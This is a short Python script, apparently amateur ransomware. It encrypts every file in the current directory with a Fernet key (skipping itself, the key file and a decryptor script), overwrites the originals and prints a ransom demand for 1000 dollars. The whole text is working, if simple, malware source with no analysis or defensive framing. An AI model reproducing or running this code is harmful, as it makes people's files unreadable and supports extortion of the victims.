#let you cherche the pc
import os

#let you encrypt the info
from cryptography.fernet import Fernet

files = []

#see all the files except 
for file in os.listdir():
    if file == "v.py" or file == "thekey.key" or file == "sol.py":
        continue
    if os.path.isfile(file):
        files.append(file)

#generate the decrypt key
key=Fernet.generate_key()

#create a file with the key
with open("thekey.key","wb") as thekey:
    thekey.write(key)

#encrypte the files
for file in files:
    with open(file,"rb") as thefile:
        content = thefile.read()
    content_encrypted = Fernet(key).encrypt(content)
    with open(file,"wb") as thefile:
        thefile.write(content_encrypted)


print("HAHAHAHAHA   ALL OF YOUR FILES ARE ENCRYPTED HAHAHAHAHA")
print('send me 1000$ to decrypte them')
    